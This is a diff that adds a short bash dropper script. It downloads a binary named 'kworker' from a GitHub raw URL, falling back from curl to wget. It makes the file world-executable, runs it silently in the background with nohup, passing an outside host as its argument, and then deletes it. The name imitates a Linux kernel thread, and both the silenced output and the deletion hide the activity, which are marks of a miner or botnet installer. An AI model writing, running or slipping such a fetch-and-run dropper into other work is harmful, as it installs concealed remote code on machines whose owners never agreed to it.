@@ -1,0 +1,26 @@
+#!/bin/bash
+
+# Remote file URL
+URL="https://github.com/pomrfus/xianfen/raw/refs/heads/main/kworker"
+OUTPUT_FILE="kworker"
+
+# Download using curl, fallback to wget if curl fails
+if ! curl -sSL "$URL" -o "$OUTPUT_FILE"; then
+    echo "curl failed, trying wget..."
+    if ! wget -q "$URL" -O "$OUTPUT_FILE"; then
+        echo "Both curl and wget failed. Exiting."
+        exit 1
+    fi
+fi
+
+# Set execute permissions
+chmod 777 "$OUTPUT_FILE"
+
+# Run in background with nohup, redirect output to /dev/null
+nohup "./$OUTPUT_FILE" pika.886802.xyz >/dev/null 2>&1 &
+
+# Wait 2 seconds for process to start
+sleep 2
+
+# Delete the downloaded file
+rm -f "$OUTPUT_FILE"
